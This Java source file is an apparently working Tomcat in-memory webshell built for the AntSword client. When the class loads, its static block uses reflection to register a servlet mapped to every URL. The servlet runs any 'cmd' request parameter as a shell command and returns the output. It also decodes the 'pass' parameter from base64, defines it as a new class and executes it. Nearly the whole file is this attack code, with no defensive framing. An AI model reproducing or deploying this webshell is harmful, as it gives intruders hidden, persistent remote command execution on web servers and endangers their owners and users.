import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Scanner;

public class AntSwordAddServlet extends ClassLoader implements Servlet{
    static {
        final String name = "AutoAddServlet";
        final String urlPattern = "/*";
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            ClassLoader z = null;
            AntSwordAddServlet evilServlet = new AntSwordAddServlet(z);

            // 创建并配置wrapper
            org.apache.catalina.Wrapper evilWrapper = standardContext.createWrapper();
            evilWrapper.setName(name);
            evilWrapper.setLoadOnStartup(1);

            evilWrapper.setServlet(evilServlet);
            evilWrapper.setServletClass(evilServlet.getClass().getName());

            // 将wrapper添加到children中
            standardContext.addChild(evilWrapper);

            // 添加mapping内容
            Method gmap = StandardContext.class.getDeclaredMethod("addServletMappingDecoded",String.class,String.class,boolean.class);
            gmap.invoke(standardContext,urlPattern, name,false);
        } catch (Exception hi) {
            //hi.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig config) throws ServletException {
        System.out.println("AntSwordAddServlet Start ......");
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        try {
            System.out.println("Do Servlet ......");
            // 获取request和response对象
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse)servletResponse;
            HttpSession session = request.getSession();

            // Cmd MemShell
            String cmd = request.getParameter("cmd");
            if(cmd != null && !cmd.isEmpty()){
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }

            // AntSword MemShell
            String Pwd = "pass";
            String cls = request.getParameter(Pwd);
            if (cls != null) {
                (new AntSwordAddServlet(getClass().getClassLoader())).g(base64Decode(cls)).newInstance().equals(new Object[] { request, response });
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public AntSwordAddServlet(ClassLoader z) {
        super(z);
    }

    public Class g(byte[] b) {
        return defineClass(b, 0, b.length);
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])clazz.getMethod("decodeBuffer", new Class[] { String.class }).invoke(clazz.newInstance(), new Object[] { str });
        } catch (Exception e) {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
            return (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
        }
    }
}